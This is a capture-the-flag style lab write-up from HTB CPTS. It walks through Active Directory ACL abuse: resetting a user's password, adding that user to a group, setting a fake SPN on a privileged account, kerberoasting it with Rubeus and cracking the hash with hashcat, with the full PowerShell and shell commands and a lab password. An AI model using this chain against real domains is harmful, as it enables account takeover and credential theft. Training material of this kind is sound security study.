# 🧰 ACL Abuse: SPN Manipulation & Kerberoasting (HTB CPTS)

## 🌟 Objective

Use ACL abuse to perform a **Kerberoasting attack** by setting a fake SPN on the privileged user `adunn`, extracting the TGS, and cracking the password.

---

## 🧩 Steps Overview

1. Reset the password of a controlled user (`damundsen`) using `wley` (who has delegated rights).
    
2. Add `damundsen` to the **Help Desk Level 1** group.
    
3. Spawn a new shell as `damundsen` to refresh the token.
    
4. Use `damundsen`'s group-inherited rights to set a fake SPN on `adunn`.
    
5. Use **Rubeus** to Kerberoast the new SPN.
    
6. Crack the hash with **Hashcat**.
    

---

## 👨‍💻 Step-by-Step Execution

### 1. Set Credential for `wley` and create PSCredential and SecureString Objects

```powershell
$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

---

### 2. Reset `damundsen`’s Password - Create SecureString Object using damundsen

```powershell
Import-Module .\PowerView.ps1
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

📅 `Password for user 'damundsen' successfully reset`

---

### 3. Log In as `damundsen` (New Token Required)

```powershell
runas /user:INLANEFREIGHT\damundsen powershell.exe
```

Then in the new shell:

```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
Import-Module .\PowerView.ps1
```

---

### 4. Add `damundsen` to Help Desk Level 1

```powershell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

📅 Confirmed `damundsen` now part of the group.

---

### 5. Set Fake SPN on `adunn`

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

📅 Fake SPN successfully set on `adunn`

---

### 6. Kerberoast with Rubeus

```powershell
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

📅 TGS Hash captured in `$krb5tgs$23$` format

---

### 7. Crack Hash with Hashcat

Save the hash to a file `adunn.hash`, then run:

```bash
hashcat -m 13100 adunn.hash /usr/share/wordlists/rockyou.txt
```

📅 Recovered `adunn`'s **cleartext password**

---

## 🔍 Notes & Tips

- SPNs can only be roasted if assigned to a user account.

- You must **refresh the user token** (log out, runas, or spawn new shell) to reflect new group rights.

- BloodHound helps verify ACL paths and delegations.
- This is a realistic privilege escalation chain using:
    - **Reset password** → **Add to group** → **Abuse new rights**

---

## 🔗 Tools Used

- `PowerView.ps1`
- `Set-DomainUserPassword`
- `Add-DomainGroupMember`
- `Set-DomainObject`
- `Rubeus.exe`
- `hashcat`

---

## ✅ Final Result

Successfully used ACL abuse to pivot from a low-privilege user to Kerberoast a privileged account, extract the TGS hash, and crack it to retrieve the **cleartext password of ************`adunn`**.